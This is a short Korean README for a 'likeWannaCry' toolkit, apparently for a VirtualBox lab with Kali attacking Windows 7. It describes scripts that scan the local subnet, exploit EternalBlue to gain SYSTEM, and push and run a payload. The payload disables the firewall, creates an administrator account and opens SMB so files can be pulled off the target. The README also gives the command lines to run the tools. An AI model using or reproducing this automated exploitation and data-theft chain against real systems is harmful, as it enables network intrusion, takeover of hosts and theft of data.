# likeWannaCry

## 주요도구 
- ms17_auto_exploit.sh : 
    - LOCAL Broadcasting Domain에서 취약한 대상을 nmap으로 스캔하고 리스트를 만든다.
    - 취약한 대상목록 기준, 이터널블루 취약점을 이용하여 SYSTEM계정으로 침투한다.
    - 만들어 놓은 악성코드를 전송하고, 실행시킨다.
- tools/shared.bat :
    - ms17_auto_exploit.sh을 사용해 전송되는 파일
    - Windows에서 실행되는 파일
    - 파일을 빼내오기 위한 smb서비스를 실행시킨다.
    - 방화벽을 무력화시킨다.
    - 관리자 계정을 생성한다.
- smbDownload.sh :
    - smb가 활성화된 Windows에 관리자 계정으로 접근해서 파일을 빼내온다.

## 환경
- VirtualBox
- 공격자 : Kali linux
- 타깃 : Windows7
- 네트워크 구성 : NAT 네트워크


## 실행
### [1] ms17_auto_exploit.sh 실행
이 Tool은  /home/kali/Documents 에서 실행한다.

`ms17_auto_exploit.sh`를 실행시킨다.
```
bash ./ms17_auto_exploit.sh 로컬도메인/서브넷 공격자IP
bash ./ms17_auto_exploit.sh 10.0.2.0/24 10.0.2.15
```
### [2] smbDownload.sh 실행
`smbDownload.sh` 실행시킨다.
```
bash ./smbDownload.sh 타깃IP
bash ./smbDownload.sh 10.0.2.4
``` 
